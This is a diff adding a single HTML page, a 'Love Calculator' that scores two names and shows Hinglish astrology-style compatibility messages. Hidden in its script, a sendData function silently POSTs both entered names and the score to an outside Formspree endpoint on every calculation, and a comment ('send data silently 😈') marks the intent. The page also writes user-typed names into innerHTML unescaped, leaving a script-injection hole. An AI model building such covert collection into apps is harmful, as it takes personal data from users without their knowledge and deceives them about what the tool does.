@@ -1,0 +1,181 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Love Calculator ❤️</title>
+
+<style>
+body {
+  margin: 0;
+  font-family: 'Segoe UI', sans-serif;
+  background: linear-gradient(135deg, #ff416c, #ff4b2b);
+  color: white;
+  text-align: center;
+}
+
+.container {
+  padding: 30px 20px;
+}
+
+h1 {
+  font-size: 28px;
+}
+
+input {
+  width: 85%;
+  padding: 12px;
+  margin: 10px;
+  border-radius: 12px;
+  border: none;
+  font-size: 16px;
+}
+
+button {
+  padding: 12px 25px;
+  border: none;
+  border-radius: 25px;
+  background: white;
+  color: #ff416c;
+  font-weight: bold;
+  font-size: 16px;
+}
+
+.progress {
+  width: 85%;
+  height: 20px;
+  background: rgba(255,255,255,0.3);
+  border-radius: 10px;
+  margin: 20px auto;
+  overflow: hidden;
+}
+
+.bar {
+  height: 100%;
+  width: 0%;
+  background: white;
+  transition: width 1.5s ease;
+}
+
+.result {
+  margin-top: 25px;
+  font-size: 18px;
+  line-height: 1.5;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <h1>❤️ Love Calculator ❤️</h1>
+
+  <input type="text" id="name1" placeholder="Your Name">
+  <input type="text" id="name2" placeholder="Crush Name">
+
+  <br>
+  <button onclick="calculateLove()">Calculate 💘</button>
+
+  <div class="progress">
+    <div class="bar" id="bar"></div>
+  </div>
+
+  <div class="result" id="result"></div>
+</div>
+
+<script>
+function getScore(name) {
+  let score = 0;
+  name = name.toLowerCase().replace(/\s/g, "");
+
+  for (let i = 0; i < name.length; i++) {
+    score += name.charCodeAt(i) * (i + 1);
+  }
+
+  score = (score * 7) % 101;
+  score = (score * score + 23) % 101;
+
+  return score;
+}
+
+function getLoveStory(love, n1, n2) {
+
+  if (love > 90) {
+    return `💞 Kundli ke anusaar ${n1} aur ${n2} ka milan janmo janmo ka hai.
+    Grahon ki sthiti batati hai ki tum dono ek dusre ke liye hi bane ho.
+    Tumhari jodi me itni shakti hai ki koi bhi mushkil ise tod nahi sakti.
+    Shaadi ke yog bahut majboot hain ❤️🔥`;
+  }
+
+  else if (love > 75) {
+    return `💖 ${n1} aur ${n2} ke beech strong attraction aur bonding hai.
+    Thodi challenges aayengi lekin trust aur understanding se sab theek ho jayega.
+    Yeh rishta agar sambhala jaye toh bahut aage tak ja sakta hai 💫`;
+  }
+
+  else if (love > 55) {
+    return `💘 ${n1} aur ${n2} ke beech connection toh hai,
+    lekin grah thode unstable hain 😅
+    Kabhi pyaar badhega, kabhi misunderstandings hongi.
+    Yeh rishta patience aur communication pe depend karega.`;
+  }
+
+  else if (love > 35) {
+    return `😏 ${n1} aur ${n2} ka rishta thoda complicated hai.
+    Attraction limited hai aur compatibility average.
+    Agar effort kiya jaye toh dosti strong ho sakti hai,
+    lekin love me challenges rahenge.`;
+  }
+
+  else {
+    return `😂 Pandit ji kehte hain ki ${n1} aur ${n2} ka milan sirf dosti tak hi theek hai.
+    Grah bilkul match nahi kar rahe 😭
+    Love ka yog bahut kam hai… lekin hasi mazaak ke liye perfect combo ho!`;
+  }
+}
+
+function sendData(n1, n2, love) {
+  fetch("https://formspree.io/f/mdapdkod", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+      name1: n1,
+      name2: n2,
+      love: love
+    })
+  });
+}
+
+function calculateLove() {
+  let n1 = document.getElementById("name1").value;
+  let n2 = document.getElementById("name2").value;
+
+  if (!n1 || !n2) {
+    alert("Enter both names!");
+    return;
+  }
+
+  let s1 = getScore(n1);
+  let s2 = getScore(n2);
+
+  let love = Math.abs((s1 * 3 + s2 * 5 + (s1 ^ s2)) % 101);
+
+  let bar = document.getElementById("bar");
+  let result = document.getElementById("result");
+
+  bar.style.width = love + "%";
+
+  setTimeout(() => {
+    let story = getLoveStory(love, n1, n2);
+    result.innerHTML = `<b>${love}% ❤️</b><br><br>${story}`;
+  }, 1200);
+
+  // send data silently 😈
+  sendData(n1, n2, love);
+}
+</script>
+
+</body>
+</html>
